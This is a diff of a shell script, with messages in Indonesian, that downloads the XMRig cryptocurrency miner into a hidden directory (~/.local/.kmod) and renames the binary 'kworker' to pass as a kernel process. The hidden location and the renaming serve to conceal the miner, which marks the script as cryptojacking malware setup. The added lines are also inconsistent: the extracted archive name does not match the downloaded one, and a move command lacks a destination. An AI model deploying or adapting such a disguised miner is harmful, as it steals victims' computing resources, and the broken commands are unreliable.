@@ -11,10 +11,10 @@ mkdir -p ~/.local/.kmod
 cd ~/.local/.kmod
 
 echo "[*] Mengunduh XMRig..."
-wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-x64.tar.gz
-tar -xzvf xmrig-6.21.2-linux-x64.tar.gz
-mv xmrig-6.21.2
-cd xmrig-6.21.2
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.3/xmrig-6.22.3-linux-static-x64.tar.gz
+tar -xzvf xmrig-6.22.3-linux-x64.tar.gz
+mv xmrig-6.22.3
+cd xmrig
 
 echo "[*] Rename binary ke kworker..."
 mv xmrig kworker
